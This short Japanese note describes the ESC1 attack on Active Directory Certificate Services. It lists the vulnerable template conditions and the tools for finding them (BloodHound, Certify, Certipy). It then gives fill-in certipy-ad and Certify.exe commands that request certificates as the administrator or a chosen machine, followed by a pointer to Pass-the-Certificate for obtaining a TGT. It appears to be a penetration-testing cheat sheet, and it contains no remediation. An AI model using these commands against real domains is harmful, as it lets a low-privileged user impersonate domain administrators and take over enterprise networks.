# ESC1

ESC1 脆弱性のある証明書テンプレートを使用すると、権限の低いユーザーが、ユーザーが指定したDomain Objectに代わって証明書を登録および要求できるようになる。登録権限を持つすべてのユーザーが、ドメイン管理者などの権限のあるアカウントの証明書を要求できることになる。

## 前提条件 – ESC1 攻撃

ESC1攻撃を行うには、次の要件を満たす必要がある

- Client Authentication : `True`
- Enable : `True`
- Enrollee Supplies Subject : `True`
- Requires Manager Approval : `False`
- Enrollement Rights
  - `Domain Users`
  - `Authenticated Users`

`BloodHound` または `Certify`, `Certipy` のfindコマンドで構成を確認できる

## 証明書テンプレートを悪用して管理者に偽造

### Linux

ユーザーアカウントを指定

```
certipy-ad req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -target <DC_DOMAIN> -ca <CA_NAME> -template <VULN_TEMPLATE> -upn administrator@<DOMAIN>
```

コンピューターアカウントを指定

```
certipy-ad req -u <USERNAME>@<DOMAIN> -p <PASSWORD> -dc-ip <DC_IP> -target <DC_DOMAIN> -ca <CA_NAME> -template <VULN_TEMPLATE> -dns <DNS_DOMAIN>
```

### Windows

```
Certify.exe request /ca:<DOMAIN>\<CA_NAME> /template:<VULN_TEMPLATE> /altname:administrator
```

証明書を取得すると[Pass-the-Certificate攻撃]()でTGTを取得し、認証することができる
